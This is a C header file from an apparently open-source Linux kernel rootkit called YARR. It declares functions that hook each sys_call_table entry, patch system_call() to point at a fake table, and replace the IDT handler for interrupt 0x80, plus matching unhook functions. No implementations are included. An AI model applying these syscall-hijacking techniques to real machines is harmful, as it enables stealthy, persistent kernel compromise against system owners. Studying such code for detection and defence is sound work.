/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_HANG_THEM_FROM_THE_YARDARM
#define __YARR_HANG_THEM_FROM_THE_YARDARM 

/***
 * Changes each entry on the sys_call_table to make them point to our hooking
 * function.
 *
 * @return: Zero on success or -1 if there were errors.
 */
int hookEachSyscall(void);

/***
 * Patchs the system_call() function to make it point to a fake sys_call_table.
 *
 * @return: Zero on success or -1 if there were errors.
 */
int patchSystemCall(void);

/***
 * Changes the handler of the IRQ 0x80 on the IDT.
 *
 * @return: Zero on success or -1 if there were errors.
 */
int hookSystemCall(void);

/***
 * Counterpart of hookEachSyscall().
 */
int unhookEachSyscall(void);

/***
 * Counterpart of patchSystemCall().
 */
int unpatchSystemCall(void);

/***
 * Counterpart of hookSystemCall().
 */
int unhookSystemCall(void);

#endif /* __YARR_HANG_THEM_FROM_THE_YARDARM. */

